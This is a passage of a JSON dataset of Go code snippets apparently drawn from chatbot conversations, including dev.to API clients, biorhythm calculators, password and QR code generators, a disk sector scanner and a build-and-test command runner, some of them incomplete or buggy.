articles {\n\t\tfmt.Println(\"ID:\", article.ID)\n\t\tfmt.Println(\"Title:\", article.Title)\n\t\tfmt.Println(\"Description:\", article.Description)\n\t\tfmt.Println()\n\t}\n}",
    "filename": "0e778e30608e2d3456ca3c7b56700dde_1.go"
  },
  {
    "conversation_hash": "e33c92dc3cadda56ddbaa8840e4f127c",
    "code_index": 2,
    "language": "Go",
    "libraries": [],
    "code": "apiURL := \"https://dev.to/api/articles/me\"\n     apiKey := \"YOUR_API_KEY\"\n\n     req, err := http.NewRequest(\"GET\", apiURL, nil)\n     if err != nil {\n     \tfmt.Println(\"Error creating request:\", err)\n     \treturn\n     }\n     req.Header.Set(\"Content-Type\", \"application/json\")\n     req.Header.Set(\"api-key\", apiKey)",
    "filename": "e33c92dc3cadda56ddbaa8840e4f127c_2.go"
  },
  {
    "conversation_hash": "e33c92dc3cadda56ddbaa8840e4f127c",
    "code_index": 3,
    "language": "Go",
    "libraries": [],
    "code": "client := &http.Client{}\n     resp, err := client.Do(req)\n     if err != nil {\n     \tfmt.Println(\"Error sending request:\", err)\n     \treturn\n     }\n     defer resp.Body.Close()\n\n     if resp.StatusCode == http.StatusOK {\n     \tbody, err := ioutil.ReadAll(resp.Body)\n     \tif err != nil {\n     \t\tfmt.Println(\"Error reading response body:\", err)\n     \t\treturn\n     \t}\n     \tfmt.Println(string(body))\n     } else {\n     \tfmt.Println(\"Error retrieving posts. Status code:\", resp.StatusCode)\n     }",
    "filename": "e33c92dc3cadda56ddbaa8840e4f127c_3.go"
  },
  {
    "conversation_hash": "a78e4a29f91909c6ac1e330a0210ebae",
    "code_index": 0,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport ( \n\t\"encoding/json\" \n\t\"fmt\" \n\t\"io/ioutil\" \n\t\"net/http\" \n\t\"time\"\n\t\n)\n\ntype Profile struct {\n    ProfileViews         int    `json:\"profile_views\"`\n    Followers            int    `json:\"followers\"`\n}\n\ntype Article struct { \n\tTitle                   string    `json:\"title\"` \n\tPageViews               int       `json:\"page_views\"` \n\tComments                int       `json:\"comments\"` \n\tCommentsCount           int       `json:\"comments_count\"` \n\tPublicReactionsCount    int       `json:\"public_reactions_count\"` \n\tPublishedTimestamp      time.Time `json:\"published_timestamp\"` \n\tPositiveReactionsCount  int       `json:\"positive_reactions_count\"` \n\t\n\tCoverImage              string    `json:\"cover_image\"`\n    SocialImage             string    `json:\"social_image\"`\n\t\n\tCreatedAt               time.Time `json:\"created_at\"` \n\tPublishedAt             time.Time `json:\"published_at\"` \n\tLastCommentAt           time.Time `json:\"last_comment_at\"` \n\tReadingTimeMinutes      int       `json:\"reading_time_minutes\"` \n\tTagList               []string    `json:\"tag_list\"` \n\t\n\tGithubUsername          string    `json:\"user.githuh_username\"`\n\tUserID                  int       `json:\"user.user_id\"`\n\tWebsiteURL              string    `json:\"user.website_url\"`\n\tProfileImage            string    `json:\"user.profile_image\"`\n}\n\nfunc main() { \n\tapiKey := \"key\"\n\turl := \"https://dev.to/api/articles?username=lu\"\n\n\treq, err := http.NewRequest(\"GET\", url, nil)\n\tif err != nil {\n\t\tfmt.Println(\"Blad tworzenia zadania:\", err)\n\t\treturn\n\t}\n\n\treq.Header.Set(\"Authorization\", \"Bearer \"+apiKey)\n\n\tclient := &http.Client{}\n\tresp, err := client.Do(req)\n\tif err != nil {\n\t\tfmt.Println(\"Blad wykonania zadania:\", err)\n\t\treturn\n\t}\n\tdefer resp.Body.Close()\n\n\tif resp.StatusCode == http.StatusUnauthorized {\n\t\tfmt.Println(\"Blad uwierzytelniania. Sprawdz poprawnosc klucza API.\")\n\t\treturn\n\t}\n\n\tbody, err := ioutil.ReadAll(resp.Body)\n\tif err != nil {\n\t\tfmt.Println(\"Blad odczytu odpowiedzi:\", err)\n\t\treturn\n\t}\n\n\tvar articles []Article\n\terr = json.Unmarshal(body, &articles)\n\tif err != nil {\n\t\tfmt.Println(\"Blad deserializacji JSON:\", err)\n\t\treturn\n\t}\n\n\tfmt.Println(\"Ilosc moich artykulow:\", len(articles))\n\tfmt.Println(\"Tytuly artykulow:\")\n\tfor _, article := range articles {\n\t\tfmt.Println(\"- \" + article.Title)\n\t}\n\n\ttotalPageViews := 0\n\ttotalComments := 0\n\tfor _, article := range articles {\n\t\ttotalPageViews += article.PageViews\n\t\ttotalComments += article.Comments\n\t\tfmt.Println(\"github_username:\", article.GithubUsername)\n\t\tfmt.Println(\"user_id:\", article.UserID)\n\t\tfmt.Println(\"website_url:\", article.WebsiteURL)\n\t\tfmt.Println(\"profile_image:\", article.ProfileImage)\n\t}\n\n\tfmt.Println(\"Ilosc wyswietlen artykulow:\", totalPageViews)\n\tfmt.Println(\"Ilosc komentarzy:\", totalComments)\n}",
    "filename": "a78e4a29f91909c6ac1e330a0210ebae_0.go"
  },
  {
    "conversation_hash": "14b7bc65d6f56dfcb3a0e6369d958b06",
    "code_index": 0,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport \"fmt\"\n\nfunc main() {\n    fmt.Println(\"Hello, World!\")\n}",
    "filename": "14b7bc65d6f56dfcb3a0e6369d958b06_0.go"
  },
  {
    "conversation_hash": "cf6d648cd39b9b80df39f572d9c1ced0",
    "code_index": 0,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport \"fmt\"\n\nfunc main() {\n    i := 0\n\n    // While loop equivalent\n    for i < 10 {\n        fmt.Println(i)\n        i++\n    }\n}",
    "filename": "cf6d648cd39b9b80df39f572d9c1ced0_0.go"
  },
  {
    "conversation_hash": "5dffa9409b4bfc85cc47e067f330a158",
    "code_index": 0,
    "language": "Go",
    "libraries": [],
    "code": "interfaces {\n    fxp0 {\n        unit 0 {\n            family inet {\n                address 192.168.1.4/24;\n            }\n        }\n    }\n}",
    "filename": "5dffa9409b4bfc85cc47e067f330a158_0.go"
  },
  {
    "conversation_hash": "1b4de9c04b147c30b8ef14675af138f8",
    "code_index": 0,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n\t\"fmt\"\n\t\"os\"\n)\n\nconst SectorSize = 512 // rozmiar sektora w bajtach\n\nfunc main() {\n\tdiskPath := \"/dev/sda\" // ścieżka do dysku twardego, np. /dev/sda na systemach Linux\n\n\tfile, err := os.Open(diskPath)\n\tif err != nil {\n\t\tfmt.Println(\"Błąd podczas otwierania dysku:\", err)\n\t\treturn\n\t}\n\tdefer file.Close()\n\n\tsector := make([]byte, SectorSize)\n\n\tvar offset int64 = 0\n\tfor {\n\t\t_, err = file.ReadAt(sector, offset)\n\t\tif err != nil {\n\t\t\tfmt.Println(\"Błąd podczas odczytu sektora:\", err)\n\t\t\treturn\n\t\t}\n\n\t\t// Sprawdzanie, czy sektor zawiera usunięty plik\n\t\tif isDeletedFile(sector) {\n\t\t\t// Wykonaj operacje na usuniętym pliku\n\t\t\t// np. wypisz jego ścieżkę\n\t\t\tfmt.Println(\"Znaleziono usunięty plik!\")\n\t\t}\n\n\t\toffset += SectorSize\n\t}\n}\n\nfunc isDeletedFile(sector []byte) bool {\n\t// Dodaj własną logikę weryfikacji sektora, czy zawiera usunięty plik\n\t// Możesz sprawdzać nagłówki plików, sygnatury, indeksy itp.\n\n\t// Poniżej znajduje się przykładowa implementacja, która wykrywa pliki oznaczone jako usunięte w systemie plików FAT\n\t// Możesz dostosować tę funkcję do swojego rodzaju systemu plików\n\n\tif len(sector) == SectorSize && sector[0] == 0xE5 {\n\t\treturn true\n\t}\n\n\treturn false\n}",
    "filename": "1b4de9c04b147c30b8ef14675af138f8_0.go"
  },
  {
    "conversation_hash": "3622eb7ce6f369ce628a52252b3d6702",
    "code_index": 0,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport \"fmt\"\n\nfunc main() {\n    // Create an empty array with a specific length\n    array := make([]int, 0)\n\n    // Append items to the array\n    array = append(array, 10)\n    array = append(array, 20)\n    array = append(array, 30)\n\n    // Print the array\n    fmt.Println(array)\n}",
    "filename": "3622eb7ce6f369ce628a52252b3d6702_0.go"
  },
  {
    "conversation_hash": "3622eb7ce6f369ce628a52252b3d6702",
    "code_index": 1,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n\t\"errors\"\n\t\"fmt\"\n)\n\nfunc divide(a, b int) (int, error) {\n\tif b == 0 {\n\t\treturn 0, errors.New(\"division by zero\")\n\t}\n\n\treturn a / b, nil\n}\n\nfunc main() {\n\tresult, err := divide(10, 0)\n\tif err != nil {\n\t\tfmt.Println(\"Error:\", err)\n\t\treturn\n\t}\n\n\tfmt.Println(\"Result:\", result)\n}",
    "filename": "3622eb7ce6f369ce628a52252b3d6702_1.go"
  },
  {
    "conversation_hash": "3622eb7ce6f369ce628a52252b3d6702",
    "code_index": 3,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n\t\"errors\"\n\t\"fmt\"\n)\n\nfunc divide(a, b int) (int, error) {\n\tif b == 0 {\n\t\treturn 0, errors.New(\"division by zero\")\n\t}\n\n\treturn a / b, nil\n}\n\nfunc main() {\n\tresult, err := divide(10, 0)\n\tif err != nil {\n\t\tfmt.Println(\"Error:\", err)\n\t\treturn\n\t}\n\n\tfmt.Println(\"Result:\", result)\n}",
    "filename": "3622eb7ce6f369ce628a52252b3d6702_3.go"
  },
  {
    "conversation_hash": "461a16bfa63cb16354910b2f957b995d",
    "code_index": 0,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n\t\"fmt\"\n\t\"image\"\n\t_ \"image/png\"\n\t\"os\"\n\n\tsvg \"github.com/fogleman/gg\"\n)\n\nfunc main() {\n\t// Wczytaj plik PNG\n\tfile, err := os.Open(\"input.png\")\n\tif err != nil {\n\t\tfmt.Println(\"Błąd podczas otwierania pliku:\", err)\n\t\treturn\n\t}\n\tdefer file.Close()\n\n\t// Konwertuj obraz na format SVG\n\timg, _, err := image.Decode(file)\n\tif err != nil {\n\t\tfmt.Println(\"Błąd podczas dekodowania obrazu:\", err)\n\t\treturn\n\t}\n\n\tdc := svg.New(os.Stdout)\n\tdc.Start(500, 500)\n\tdc.SetRGB(0, 0, 0)\n\tdc.Clear()\n\n\t// Narysuj obraz\n\tdc.DrawImage(img, 0, 0)\n\n\tdc.End()\n}",
    "filename": "461a16bfa63cb16354910b2f957b995d_0.go"
  },
  {
    "conversation_hash": "d0e1c9c7a17163f9ef31c8a9d40e968c",
    "code_index": 0,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n\t\"fmt\"\n\t\"log\"\n\t\"os\"\n\t\"os/exec\"\n)\n\nfunc main() {\n\t// Uruchomienie kolejnych poleceń w terminalu\n\tcmds := []string{\n\t\t\"git pull\",\n\t\t\"go build\",\n\t\t\"go test\",\n\t\t\"docker build -t myapp .\",\n\t\t\"docker run myapp\",\n\t}\n\n\tfor _, cmd := range cmds {\n\t\terr := runCommand(cmd)\n\t\tif err != nil {\n\t\t\tlog.Fatal(err)\n\t\t}\n\t}\n}\n\n// Funkcja pomagająca uruchamiać polecenia w terminalu\nfunc runCommand(command string) error {\n\tcmd := exec.Command(\"/bin/sh\", \"-c\", command)\n\tcmd.Stdout = os.Stdout\n\tcmd.Stderr = os.Stderr\n\n\terr := cmd.Run()\n\tif err != nil {\n\t\treturn fmt.Errorf(\"error executing command '%s': %s\", command, err)\n\t}\n\n\treturn nil\n}",
    "filename": "d0e1c9c7a17163f9ef31c8a9d40e968c_0.go"
  },
  {
    "conversation_hash": "d0e1c9c7a17163f9ef31c8a9d40e968c",
    "code_index": 1,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n\t\"fmt\"\n\t\"log\"\n\t\"os\"\n\t\"os/exec\"\n)\n\nfunc main() {\n\t// Uruchomienie kolejnych poleceń w terminalu\n\tcmds := []string{\n\t\t\"git pull\",\n\t\t\"go build\",\n\t\t\"go test\",\n\t\t\"docker build -t myapp .\",\n\t\t\"docker run myapp\",\n\t}\n\n\tfor _, cmd := range cmds {\n\t\terr := runCommand(cmd)\n\t\tif err != nil {\n\t\t\tlog.Fatal(err)\n\t\t}\n\t}\n\n\t// Przykładowa analiza statyczna kodu przy użyciu narzędzia gosec\n\terr := runCommand(\"gosec ./...\")\n\tif err != nil {\n\t\tlog.Fatal(err)\n\t}\n\n\t// Przykładowy test penetracyjny przy użyciu narzędzia OWASP ZAP\n\terr = runCommand(\"zap-cli --spider https://myapp\")\n\tif err != nil {\n\t\tlog.Fatal(err)\n\t}\n}\n\n// Funkcja pomagająca uruchamiać polecenia w terminalu\nfunc runCommand(command string) error {\n\tcmd := exec.Command(\"/bin/sh\", \"-c\", command)\n\tcmd.Stdout = os.Stdout\n\tcmd.Stderr = os.Stderr\n\n\terr := cmd.Run()\n\tif err != nil {\n\t\treturn fmt.Errorf(\"error executing command '%s': %s\", command, err)\n\t}\n\n\treturn nil\n}",
    "filename": "d0e1c9c7a17163f9ef31c8a9d40e968c_1.go"
  },
  {
    "conversation_hash": "a1540f9775488bf06d690243d342b823",
    "code_index": 0,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n\t\"fmt\"\n\t\"math\"\n\t\"time\"\n)\n\nfunc main() {\n\t// Przykładowa data dla której chcemy wygenerować biorytmy\n\tbirthday := time.Date(2000, 1, 1, 0, 0, 0, 0, time.UTC)\n\n\t// Tworzenie daty dla obecnej daty i czasu\n\tnow := time.Now()\n\n\t// Obliczanie liczby dni od urodzin do obecnej daty\n\tdays := now.Sub(birthday).Hours() / 24\n\n\t// Obliczanie biorytmu dla danego dnia\n\tphysical := math.Sin(2 * math.Pi * days / 23) * 100\n\temotional := math.Sin(2 * math.Pi * days / 28) * 100\n\tintellectual := math.Sin(2 * math.Pi * days / 33) * 100\n\n\tfmt.Println(\"Biorytmy na dzień:\", now.Format(\"02-01-2006\"))\n\tfmt.Printf(\"Fizyczny: %.2f%%\\n\", physical)\n\tfmt.Printf(\"Emocjonalny: %.2f%%\\n\", emotional)\n\tfmt.Printf(\"Intelektualny: %.2f%%\\n\", intellectual)\n\n\t// Obliczanie biorytmów na dany tydzień\n\tweeks := days / 7\n\tphysicalWeek := math.Sin(2 * math.Pi * weeks / 23) * 100\n\temotionalWeek := math.Sin(2 * math.Pi * weeks / 28) * 100\n\tintellectualWeek := math.Sin(2 * math.Pi * weeks / 33) * 100\n\n\tfmt.Println(\"\\nBiorytmy na tydzień:\", now.Format(\"02-01-2006\"))\n\tfmt.Printf(\"Fizyczny: %.2f%%\\n\", physicalWeek)\n\tfmt.Printf(\"Emocjonalny: %.2f%%\\n\", emotionalWeek)\n\tfmt.Printf(\"Intelektualny: %.2f%%\\n\", intellectualWeek)\n\n\t// Obliczanie biorytmów na dany miesiąc\n\tmonths := days / 30.4375\n\tphysicalMonth := math.Sin(2 * math.Pi * months / 23) * 100\n\temotionalMonth := math.Sin(2 * math.Pi * months / 28) * 100\n\tintellectualMonth := math.Sin(2 * math.Pi * months / 33) * 100\n\n\tfmt.Println(\"\\nBiorytmy na miesiąc:\", now.Format(\"02-01-2006\"))\n\tfmt.Printf(\"Fizyczny: %.2f%%\\n\", physicalMonth)\n\tfmt.Printf(\"Emocjonalny: %.2f%%\\n\", emotionalMonth)\n\tfmt.Printf(\"Intelektualny: %.2f%%\\n\", intellectualMonth)\n\n\t// Obliczanie biorytmów na dany rok\n\tyears := days / 365.25\n\tphysicalYear := math.Sin(2 * math.Pi * years / 23) * 100\n\temotionalYear := math.Sin(2 * math.Pi * years / 28) * 100\n\tintellectualYear := math.Sin(2 * math.Pi * years / 33) * 100\n\n\tfmt.Println(\"\\nBiorytmy na rok:\", now.Format(\"02-01-2006\"))\n\tfmt.Printf(\"Fizyczny: %.2f%%\\n\", physicalYear)\n\tfmt.Printf(\"Emocjonalny: %.2f%%\\n\", emotionalYear)\n\tfmt.Printf(\"Intelektualny: %.2f%%\\n\", intellectualYear)\n}",
    "filename": "a1540f9775488bf06d690243d342b823_0.go"
  },
  {
    "conversation_hash": "c820899530f41db84f2f3671c24f3e97",
    "code_index": 0,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n\t\"fmt\"\n\t\"math\"\n\t\"time\"\n)\n\nfunc main() {\n\tinputDate := getInputDate()\n\n\tbirthday, err := parseDate(inputDate)\n\tif err != nil {\n\t\tfmt.Println(\"Nieprawidłowy format daty.\")\n\t\treturn\n\t}\n\n\tprintBiorythms(\"Dzień\", getDate(), calculateBiorythms(birthday, 23, 28, 33))\n\tprintBiorythms(\"Tydzień\", getDate(), calculateBiorythms(birthday, 23*7, 28*7, 33*7))\n\tprintBiorythms(\"Miesiąc\", getDate(), calculateBiorythms(birthday, 23*30.4375, 28*30.4375, 33*30.4375))\n\tprintBiorythms(\"Rok\", getDate(), calculateBiorythms(birthday, 23*365.25, 28*365.25, 33*365.25))\n}\n\nfunc getInputDate() string {\n\tvar inputDate string\n\tfmt.Print(\"Wprowadź datę (RRRR-MM-DD): \")\n\tfmt.Scanln(&inputDate)\n\treturn inputDate\n}\n\nfunc parseDate(inputDate string) (time.Time, error) {\n\tbirthday, err := time.Parse(\"2006-01-02\", inputDate)\n\tif err != nil {\n\t\treturn time.Time{}, err\n\t}\n\treturn birthday, nil\n}\n\nfunc getDate() string {\n\tnow := time.Now()\n\treturn now.Format(\"02-01-2006\")\n}\n\nfunc calculateBiorythms(birthday time.Time, physicalCycle, emotionalCycle, intellectualCycle float64) (float64, float64, float64) {\n\tdays := time.Since(birthday).Hours() / 24\n\n\tphysical := math.Sin(2 * math.Pi * days / physicalCycle) * 100\n\temotional := math.Sin(2 * math.Pi * days / emotionalCycle) * 100\n\tintellectual := math.Sin(2 * math.Pi * days / intellectualCycle) * 100\n\n\treturn physical, emotional, intellectual\n}\n\nfunc printBiorythms(period, date string, biorythms []float64) {\n\tfmt.Println(\"\\nBiorytmy na\", period+\":\", date)\n\tfmt.Printf(\"Fizyczny: %.2f%%\\n\", biorythms[0])\n\tfmt.Printf(\"Emocjonalny: %.2f%%\\n\", biorythms[1])\n\tfmt.Printf(\"Intelektualny: %.2f%%\\n\", biorythms[2])\n}",
    "filename": "c820899530f41db84f2f3671c24f3e97_0.go"
  },
  {
    "conversation_hash": "32b6ac1cfc0fb69134ede518b58dabdf",
    "code_index": 1,
    "language": "Go",
    "libraries": [],
    "code": "func createChart(birthday time.Time, physicalCycle, emotionalCycle, intellectualCycle float64) {\n\tnumberOfDays := int(time.Since(birthday).Hours() / 24)\n\n\tphysicalData := make([]chart.Value, numberOfDays)\n\temotionalData := make([]chart.Value, numberOfDays)\n\tintellectualData := make([]chart.Value, numberOfDays)\n\n\tfor i := 0; i < numberOfDays; i++ {\n\t\tdays := float64(i)\n\t\tphysicalData[i] = chart.Value{\n\t\t\tLabel: fmt.Sprintf(\"%d\", i),\n\t\t\tValue: math.Sin(2*math.Pi*days/physicalCycle) * 100,\n\t\t}\n\t\temotionalData[i] = chart.Value{\n\t\t\tLabel: fmt.Sprintf(\"%d\", i),\n\t\t\tValue: math.Sin(2*math.Pi*days/emotionalCycle) * 100,\n\t\t}\n\t\tintellectualData[i] = chart.Value{\n\t\t\tLabel: fmt.Sprintf(\"%d\", i),\n\t\t\tValue: math.Sin(2*math.Pi*days/intellectualCycle) * 100,\n\t\t}\n\t}\n\n\tseries := []chart.ChartSeries{\n\t\t{ // Physical\n\t\t\tName:    \"Fizyczny\",\n\t\t\tXValues: chart.IndexValueFormatter(physicalData),\n\t\t\tYValues: chart.ValueFormatter(physicalData),\n\t\t},\n\t\t{ // Emotional\n\t\t\tName:    \"Emocjonalny\",\n\t\t\tXValues: chart.IndexValueFormatter(emotionalData),\n\t\t\tYValues: chart.ValueFormatter(emotionalData),\n\t\t},\n\t\t{ // Intellectual\n\t\t\tName:    \"Intelektualny\",\n\t\t\tXValues: chart.IndexValueFormatter(intellectualData),\n\t\t\tYValues: chart.ValueFormatter(intellectualData),\n\t\t},\n\t}\n\n\tgraph := chart.Chart{\n\t\tTitle:      \"Wykres biorytmów\",\n\t\tTitleStyle: chart.StyleShow(),\n\n\t\tXAxis: chart.XAxis{\n\t\t\tName:      \"Dni\",\n\t\t\tNameStyle: chart.StyleShow(),\n\t\t\tStyle:     chart.StyleShow(),\n\t\t\tTickStyle: chart.StyleShow(),\n\t\t},\n\n\t\tYAxis: chart.YAxis{\n\t\t\tName:      \"Wartość\",\n\t\t\tNameStyle: chart.StyleShow(),\n\t\t\tStyle:     chart.StyleShow(),\n\t\t\tTickStyle: chart.StyleShow(),\n\t\t},\n\n\t\tBackground: chart.Style{\n\t\t\tPadding: chart.Box{\n\t\t\t\tTop:    20,\n\t\t\t\tLeft:   20,\n\t\t\t\tRight:  20,\n\t\t\t\tBottom: 20,\n\t\t\t},\n\t\t},\n\n\t\tSeries: series,\n\t}\n\n\tf, err := os.Create(\"biorythms.png\")\n\tif err != nil {\n\t\tfmt.Println(\"Błąd przy zapisie pliku.\")\n\t\treturn\n\t}\n\tdefer f.Close()\n\n\terr = graph.Render(chart.PNG, f)\n\tif err != nil {\n\t\tfmt.Println(\"Błąd przy generowaniu wykresu.\")\n\t\treturn\n\t}\n\n\tfmt.Println(\"Wykres został zapisany jako: biorythms.png\")\n}",
    "filename": "32b6ac1cfc0fb69134ede518b58dabdf_1.go"
  },
  {
    "conversation_hash": "212d492e66d52b02cbefa9725b593430",
    "code_index": 0,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n\t\"fmt\"\n\t\"io/ioutil\"\n\t\"log\"\n\t\"os\"\n\t\"strings\"\n\t\"unicode\"\n)\n\nfunc main() {\n\tif len(os.Args) < 2 {\n\t\tlog.Fatal(\"Podaj nazwę pliku do analizy\")\n\t}\n\n\tfilename := os.Args[1]\n\n\tfilecontent, err := ioutil.ReadFile(filename)\n\tif err != nil {\n\t\tlog.Fatal(err)\n\t}\n\n\tcontent := string(filecontent)\n\tcontent = strings.ToLower(content)\n\n\tcharCount := make(map[rune]int)\n\n\tfor _, char := range content {\n\t\tif unicode.IsLetter(char) || unicode.IsDigit(char) || unicode.IsPunct(char) {\n\t\t\tcharCount[char]++\n\t\t}\n\t}\n\n\tfmt.Println(\"Wynik analizy:\")\n\n\tfor char, count := range charCount {\n\t\tfmt.Printf(\"%c = %d\\n\", char, count)\n\t}\n}",
    "filename": "212d492e66d52b02cbefa9725b593430_0.go"
  },
  {
    "conversation_hash": "66d231bbd45fab1a8e5e5a4ca19f3937",
    "code_index": 0,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport \"fmt\"\n\nfunc main() {\n    arr := []string{\"apple\", \"banana\", \"cherry\"}\n\n    key := \"banana\"\n    exists := false\n\n    for _, value := range arr {\n        if value == key {\n            exists = true\n            break\n        }\n    }\n\n    if exists {\n        fmt.Println(\"Key exists in the array\")\n    } else {\n        fmt.Println(\"Key does not exist in the array\")\n    }\n}",
    "filename": "66d231bbd45fab1a8e5e5a4ca19f3937_0.go"
  },
  {
    "conversation_hash": "66d231bbd45fab1a8e5e5a4ca19f3937",
    "code_index": 1,
    "language": "Go",
    "libraries": [],
    "code": "package common\n\ntype MyStruct struct {\n    Field1 string\n    Field2 int\n}",
    "filename": "66d231bbd45fab1a8e5e5a4ca19f3937_1.go"
  },
  {
    "conversation_hash": "66d231bbd45fab1a8e5e5a4ca19f3937",
    "code_index": 2,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n    \"fmt\"\n    \"your-module-path/common\"\n)\n\nfunc main() {\n    myStruct := common.MyStruct{\n        Field1: \"Hello\",\n        Field2: 42,\n    }\n\n    fmt.Println(myStruct)\n}",
    "filename": "66d231bbd45fab1a8e5e5a4ca19f3937_2.go"
  },
  {
    "conversation_hash": "66d231bbd45fab1a8e5e5a4ca19f3937",
    "code_index": 4,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n    \"fmt\"\n    \"project/utils/helper\"\n)\n\nfunc main() {\n    helper.DoSomething()\n    fmt.Println(helper.SomeValue)\n}",
    "filename": "66d231bbd45fab1a8e5e5a4ca19f3937_4.go"
  },
  {
    "conversation_hash": "6dce892851d6a98fec40172dc1ec228e",
    "code_index": 0,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n\t\"fmt\"\n\t\"io/ioutil\"\n\t\"os\"\n\t\"path/filepath\"\n\t\"strings\"\n)\n\nfunc main() {\n\tresults := make(map[string][2]int)\n\tsearchDirectory(\".\", results)\n\n\tfor extension, countAndSize := range results {\n\t\tfmt.Printf(\"%s=%d,%d\\n\", extension, countAndSize[0], countAndSize[1])\n\t}\n}\n\nfunc searchDirectory(directory string, results map[string][2]int) {\n\tfileList, err := ioutil.ReadDir(directory)\n\tif err != nil {\n\t\tfmt.Printf(\"Błąd podczas odczytu katalogu: %s\\n\", err.Error())\n\t\treturn\n\t}\n\n\tfor _, file := range fileList {\n\t\tif file.IsDir() {\n\t\t\tsearchDirectory(filepath.Join(directory, file.Name()), results)\n\t\t} else {\n\t\t\tfileName := file.Name()\n\t\t\textension := strings.ToLower(filepath.Ext(fileName))[1:]\n\t\t\tfileSize := file.Size() / 1024 / 1024\n\n\t\t\tif _, found := results[extension]; found {\n\t\t\t\tresults[extension][0]++\n\t\t\t\tresults[extension][1] += int(fileSize)\n\t\t\t} else {\n\t\t\t\tresults[extension] = [2]int{1, int(fileSize)}\n\t\t\t}\n\t\t}\n\t}\n}",
    "filename": "6dce892851d6a98fec40172dc1ec228e_0.go"
  },
  {
    "conversation_hash": "43280c159acfc2b87ae67ff92086458f",
    "code_index": 0,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n\t\"fmt\"\n\t\"math/rand\"\n\t\"time\"\n)\n\nconst (\n\tUpperCaseLetters = \"ABCDEFGHIJKLMNOPQRSTUVWXYZ\"\n\tLowerCaseLetters = \"abcdefghijklmnopqrstuvwxyz\"\n\tDigits           = \"0123456789\"\n)\n\nfunc generatePassword(length int) string {\n\t// Zdefiniuj dostępne znaki dla hasła\n\tavailableChars := UpperCaseLetters + LowerCaseLetters + Digits\n\n\t// Inicjalizuj generator liczb pseudolosowych na podstawie aktualnego czasu\n\trand.Seed(time.Now().UnixNano())\n\n\t// Twórz losowe hasło\n\tpassword := make([]byte, length)\n\tfor i := 0; i < length; i++ {\n\t\t// Wybierz losowy znak z dostępnych\n\t\tindex := rand.Intn(len(availableChars))\n\t\tpassword[i] = availableChars[index]\n\t}\n\n\treturn string(password)\n}\n\nfunc main() {\n\tfmt.Println(\"Generator hasła\")\n\n\t// Zapytaj użytkownika o długość hasła\n\tvar length int\n\tfmt.Print(\"Podaj długość hasła: \")\n\tfmt.Scan(&length)\n\n\t// Wygeneruj i wyświetl hasło\n\tpassword := generatePassword(length)\n\tfmt.Println(\"Wygenerowane hasło:\", password)\n}",
    "filename": "43280c159acfc2b87ae67ff92086458f_0.go"
  },
  {
    "conversation_hash": "43280c159acfc2b87ae67ff92086458f",
    "code_index": 1,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n\t\"fmt\"\n\t\"math/rand\"\n\t\"time\"\n)\n\nconst (\n\tUpperCaseLetters = \"ABCDEFGHIJKLMNOPQRSTUVWXYZ\"\n\tLowerCaseLetters = \"abcdefghijklmnopqrstuvwxyz\"\n\tDigits           = \"0123456789\"\n\tSpecialChars     = \"!@#$%^&*()_+-=<>?{}\"\n)\n\nfunc generatePassword(length int) string {\n\t// Zdefiniuj dostępne znaki dla hasła\n\tavailableChars := UpperCaseLetters + LowerCaseLetters + Digits + SpecialChars\n\n\t// Inicjalizuj generator liczb pseudolosowych na podstawie aktualnego czasu\n\trand.Seed(time.Now().UnixNano())\n\n\t// Twórz losowe hasło\n\tpassword := make([]byte, length)\n\tfor i := 0; i < length; i++ {\n\t\t// Wybierz losowy znak z dostępnych\n\t\tindex := rand.Intn(len(availableChars))\n\t\tpassword[i] = availableChars[index]\n\t}\n\n\treturn string(password)\n}\n\nfunc main() {\n\tfmt.Println(\"Generator hasła\")\n\n\t// Zapytaj użytkownika o długość hasła\n\tvar length int\n\tfmt.Print(\"Podaj długość hasła: \")\n\tfmt.Scan(&length)\n\n\t// Wygeneruj i wyświetl hasło\n\tpassword := generatePassword(length)\n\tfmt.Println(\"Wygenerowane hasło:\", password)\n}",
    "filename": "43280c159acfc2b87ae67ff92086458f_1.go"
  },
  {
    "conversation_hash": "f4811cea60459f5dea93357f212f98c3",
    "code_index": 0,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n\t\"flag\"\n\t\"image\"\n\t\"image/png\"\n\t\"log\"\n\t\"net/url\"\n\t\"os\"\n\n\tqrcode \"github.com/skip2/go-qrcode\"\n)\n\nfunc main() {\n\t// Pobierz adres strony www jako argument z wiersza poleceń\n\turlFlag := flag.String(\"url\", \"\", \"Adres strony www\")\n\tflag.Parse()\n\n\t// Sprawdź, czy adres strony www został podany\n\tif *urlFlag == \"\" {\n\t\tlog.Fatal(\"Proszę podać adres strony www używając flagi -url\")\n\t}\n\n\t// Sprawdź poprawność adresu URL\n\t_, err := url.ParseRequestURI(*urlFlag)\n\tif err != nil {\n\t\tlog.Fatal(\"Nieprawidłowy adres URL:\", err)\n\t}\n\n\t// Wygeneruj kod QR na podstawie adresu strony www\n\tqrCode, err := qrcode.New(*urlFlag, qrcode.Medium)\n\tif err != nil {\n\t\tlog.Fatal(\"Błąd podczas generowania kodu QR:\", err)\n\t}\n\n\t// Zapisz kod QR do pliku PNG\n\tfile, err := os.Create(\"qrcode.png\")\n\tif err != nil {\n\t\tlog.Fatal(\"Błąd podczas tworzenia pliku:\", err)\n\t}\n\tdefer file.Close()\n\n\terr = png.Encode(file, qrCode.Image(256))\n\tif err != nil {\n\t\tlog.Fatal(\"Błąd podczas zapisywania kodu QR do pliku:\", err)\n\t}\n\n\tlog.Println(\"Kod QR został 